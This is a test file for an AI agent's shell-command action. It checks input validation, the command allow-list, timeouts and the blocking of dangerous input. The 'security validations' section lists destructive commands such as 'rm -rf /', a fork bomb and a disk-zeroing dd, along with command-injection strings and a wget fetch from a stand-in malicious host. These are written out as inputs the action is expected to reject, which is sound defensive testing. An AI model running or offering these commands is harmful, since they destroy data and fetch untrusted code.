import { describe, it, expect, beforeEach, afterEach, mock } from 'bun:test';
import { executeCommandAction } from '../../actions/command-action';
import { createMockRuntime, createMockMemory, createMockState } from '../utils/mock-runtime';
import type { IAgentRuntime, Memory, State } from '@elizaos/core';
import { spawn, exec } from 'child_process';

// Mock child_process
mock.module('child_process', async () => {
  const actual = await import('child_process');
  return {
    ...actual,
    spawn: mock(),
    exec: mock(),
  };
});

// Mock promisify
mock.module('util', () => ({
  promisify: mock((fn) => {
    // Return a function that returns a promise
    return (command: string, options?: any) => {
      return Promise.resolve({
        stdout: 'Command output',
        stderr: '',
      });
    };
  }),
}));

describe('executeCommandAction', () => {
  let mockRuntime: IAgentRuntime;
  let mockMemory: Memory;
  let mockState: State;
  let mockCallback: any;
  let mockProcess: any;

  beforeEach(() => {
    mock.restore();

    // Mock child process
    mockProcess = {
      stdout: {
        on: mock(),
        pipe: mock(),
      },
      stderr: {
        on: mock(),
        pipe: mock(),
      },
      on: mock(),
      kill: mock(),
    };

    mock(spawn).mockReturnValue(mockProcess);
    (mock(exec) as any).mockImplementation((command: any, options: any, callback: any) => {
      // Handle both function signatures
      const cb = typeof options === 'function' ? options : callback;
      if (cb) {
        // Simulate successful command execution
        setTimeout(() => {
          cb(null, 'Command output', '');
        }, 10);
      }
      return mockProcess as any;
    });

    mockRuntime = createMockRuntime({
      settings: {
        ALLOWED_COMMANDS: JSON.stringify(['ls', 'echo', 'cat', 'pwd', 'date']),
        COMMAND_TIMEOUT: '30000',
        SAFE_MODE: 'true',
      },
    });
    mockCallback = mock();
    mockState = createMockState();
  });

  afterEach(() => {
    mock.restore();
  });

  describe('validate', () => {
    it('should return true for valid command execution requests', async () => {
      mockMemory = createMockMemory({
        content: {
          text: 'Run the command ls -la',
          source: 'test',
        },
      });

      const result = await executeCommandAction.validate(mockRuntime, mockMemory, mockState);
      expect(result).toBe(true);
    });

    it('should return true for shell script requests', async () => {
      mockMemory = createMockMemory({
        content: {
          text: 'Execute echo "Hello World"',
          source: 'test',
        },
      });

      const result = await executeCommandAction.validate(mockRuntime, mockMemory, mockState);
      expect(result).toBe(true);
    });

    it('should return false for non-command related requests', async () => {
      mockMemory = createMockMemory({
        content: {
          text: 'What is the weather today?',
          source: 'test',
        },
      });

      const result = await executeCommandAction.validate(mockRuntime, mockMemory, mockState);
      expect(result).toBe(false);
    });

    it('should return false for empty messages', async () => {
      mockMemory = createMockMemory({
        content: {
          text: '',
          source: 'test',
        },
      });

      const result = await executeCommandAction.validate(mockRuntime, mockMemory, mockState);
      expect(result).toBe(false);
    });
  });

  describe('handler - safe commands', () => {
    it('should execute allowed commands successfully', async () => {
      const mockStdout = 'file1.txt\nfile2.txt\ndirectory/\n';

      // Simulate successful command execution
      mockProcess.stdout.on.mockImplementation((event, callback) => {
        if (event === 'data') {
          setTimeout(() => callback(Buffer.from(mockStdout)), 10);
        }
      });
      mockProcess.stderr.on.mockImplementation((event, callback) => {
        if (event === 'data') {
          // No stderr output
        }
      });
      mockProcess.on.mockImplementation((event, callback) => {
        if (event === 'close') {
          setTimeout(() => callback(0), 20);
        }
      });

      mockMemory = createMockMemory({
        content: {
          text: 'Run ls -la',
          source: 'test',
        },
      });

      await executeCommandAction.handler(mockRuntime, mockMemory, mockState, {}, mockCallback);

      expect(spawn).toHaveBeenCalledWith('ls', ['-la'], {
        shell: true,
        cwd: expect.any(String),
      });

      // Wait for async execution
      await new Promise((resolve) => setTimeout(resolve, 50));

      expect(mockCallback).toHaveBeenCalledWith(
        expect.objectContaining({
          text: expect.stringContaining('Command executed'),
          thought: expect.stringContaining('executed'),
          actions: ['EXECUTE_COMMAND'],
        })
      );
    });

    it('should handle command with arguments', async () => {
      mockProcess.stdout.on.mockImplementation((event, callback) => {
        if (event === 'data') {
          setTimeout(() => callback(Buffer.from('Hello World')), 10);
        }
      });
      mockProcess.stderr.on.mockImplementation((event, callback) => {});
      mockProcess.on.mockImplementation((event, callback) => {
        if (event === 'close') {
          setTimeout(() => callback(0), 20);
        }
      });

      mockMemory = createMockMemory({
        content: {
          text: 'Execute echo "Hello World"',
          source: 'test',
        },
      });

      await executeCommandAction.handler(mockRuntime, mockMemory, mockState, {}, mockCallback);

      expect(spawn).toHaveBeenCalledWith('echo', ['"Hello World"'], {
        shell: true,
        cwd: expect.any(String),
      });
    });

    it('should handle command execution errors', async () => {
      const mockStderr = 'command not found: invalidcommand';

      mockProcess.stdout.on.mockImplementation((event, callback) => {});
      mockProcess.stderr.on.mockImplementation((event, callback) => {
        if (event === 'data') {
          setTimeout(() => callback(Buffer.from(mockStderr)), 10);
        }
      });
      mockProcess.on.mockImplementation((event, callback) => {
        if (event === 'close') {
          setTimeout(() => callback(1), 20); // Exit code 1 = error
        }
      });

      mockMemory = createMockMemory({
        content: {
          text: 'Run invalidcommand',
          source: 'test',
        },
      });

      await executeCommandAction.handler(mockRuntime, mockMemory, mockState, {}, mockCallback);

      await new Promise((resolve) => setTimeout(resolve, 50));

      expect(mockCallback).toHaveBeenCalledWith(
        expect.objectContaining({
          text: expect.stringContaining('Command failed'),
          thought: expect.stringContaining('error'),
          actions: ['EXECUTE_COMMAND'],
        })
      );
    });

    it('should handle command timeouts', async () => {
      // Mock a command that never completes
      mockProcess.stdout.on.mockImplementation((event, callback) => {});
      mockProcess.stderr.on.mockImplementation((event, callback) => {});
      mockProcess.on.mockImplementation((event, callback) => {
        // Never call the close event to simulate hanging
      });

      // Set a shorter timeout for testing
      const shortTimeoutRuntime = createMockRuntime({
        settings: {
          ALLOWED_COMMANDS: JSON.stringify(['ls']),
          COMMAND_TIMEOUT: '100', // 100ms timeout
          SAFE_MODE: 'true',
        },
      });

      mockMemory = createMockMemory({
        content: {
          text: 'Run ls -la',
          source: 'test',
        },
      });

      await executeCommandAction.handler(
        shortTimeoutRuntime,
        mockMemory,
        mockState,
        {},
        mockCallback
      );

      // Wait for timeout
      await new Promise((resolve) => setTimeout(resolve, 200));

      expect(mockProcess.kill).toHaveBeenCalledWith('SIGTERM');
      expect(mockCallback).toHaveBeenCalledWith(
        expect.objectContaining({
          text: expect.stringContaining('Command timed out'),
          thought: expect.stringContaining('timeout'),
          actions: ['EXECUTE_COMMAND'],
        })
      );
    });
  });

  describe('security validations', () => {
    it('should block dangerous commands', async () => {
      const dangerousCommands = [
        'rm -rf /',
        'sudo rm -rf /',
        'format C:',
        'del /F /S /Q C:\\',
        'dd if=/dev/zero',
        'sudo passwd',
        ':(){ :|:& };:',
      ];

      for (const cmd of dangerousCommands) {
        mockMemory = createMockMemory({
          content: {
            text: `Run ${cmd}`,
            source: 'test',
          },
        });

        await executeCommandAction.handler(mockRuntime, mockMemory, mockState, {}, mockCallback);

        expect(mockCallback).toHaveBeenCalledWith(
          expect.objectContaining({
            text: expect.stringContaining('not allowed'),
            thought: expect.stringContaining('security'),
            actions: ['EXECUTE_COMMAND'],
          })
        );

        mockCallback.mockClear();
      }
    });

    it('should prevent command injection attempts', async () => {
      const injectionAttempts = [
        'ls; rm -rf /',
        'echo "test" && rm file.txt',
        'cat file.txt | sudo rm -rf /',
        'ls `rm -rf /`',
        'echo $(rm -rf /)',
      ];

      for (const cmd of injectionAttempts) {
        mockMemory = createMockMemory({
          content: {
            text: `Execute ${cmd}`,
            source: 'test',
          },
        });

        await executeCommandAction.handler(mockRuntime, mockMemory, mockState, {}, mockCallback);

        expect(mockCallback).toHaveBeenCalledWith(
          expect.objectContaining({
            text: expect.stringContaining('security risk'),
            thought: expect.stringContaining('injection'),
            actions: ['EXECUTE_COMMAND'],
          })
        );

        mockCallback.mockClear();
      }
    });

    it('should enforce allowed commands whitelist', async () => {
      mockMemory = createMockMemory({
        content: {
          text: 'Run wget http://malicious.com/script.sh',
          source: 'test',
        },
      });

      await executeCommandAction.handler(mockRuntime, mockMemory, mockState, {}, mockCallback);

      expect(mockCallback).toHaveBeenCalledWith(
        expect.objectContaining({
          text: expect.stringContaining('not in allowed list'),
          thought: expect.stringContaining('not allowed'),
          actions: ['EXECUTE_COMMAND'],
        })
      );
    });

    it('should validate command arguments', async () => {
      mockMemory = createMockMemory({
        content: {
          text: 'Run ls --help; rm -rf /',
          source: 'test',
        },
      });

      await executeCommandAction.handler(mockRuntime, mockMemory, mockState, {}, mockCallback);

      expect(mockCallback).toHaveBeenCalledWith(
        expect.objectContaining({
          text: expect.stringContaining('security risk'),
          thought: expect.stringContaining('injection'),
          actions: ['EXECUTE_COMMAND'],
        })
      );
    });

    it('should handle safe mode enforcement', async () => {
      // Test with safe mode disabled
      const unsafeRuntime = createMockRuntime({
        settings: {
          SAFE_MODE: 'false',
          COMMAND_TIMEOUT: '30000',
        },
      });

      mockMemory = createMockMemory({
        content: {
          text: 'Run custom_script.sh',
          source: 'test',
        },
      });

      await executeCommandAction.handler(unsafeRuntime, mockMemory, mockState, {}, mockCallback);

      // In unsafe mode, should still validate for basic security
      expect(mockCallback).toHaveBeenCalledWith(
        expect.objectContaining({
          text: expect.stringContaining('Command executed'),
          actions: ['EXECUTE_COMMAND'],
        })
      );
    });
  });

  describe('action structure', () => {
    it('should have correct action metadata', () => {
      expect(executeCommandAction.name).toBe('EXECUTE_COMMAND');
      expect(executeCommandAction.similes).toContain('RUN_COMMAND');
      expect(executeCommandAction.similes).toContain('SHELL_EXECUTE');
      expect(executeCommandAction.description).toContain('command line operations');
      expect(typeof executeCommandAction.validate).toBe('function');
      expect(typeof executeCommandAction.handler).toBe('function');
      expect(Array.isArray(executeCommandAction.examples)).toBe(true);
    });

    it('should have valid examples', () => {
      expect(executeCommandAction.examples!.length).toBeGreaterThan(0);

      executeCommandAction.examples!.forEach((example) => {
        expect(Array.isArray(example)).toBe(true);
        expect(example.length).toBeGreaterThanOrEqual(2);

        example.forEach((turn) => {
          expect(turn).toHaveProperty('name');
          expect(turn).toHaveProperty('content');
          expect(typeof turn.content).toBe('object');
        });
      });
    });
  });
});
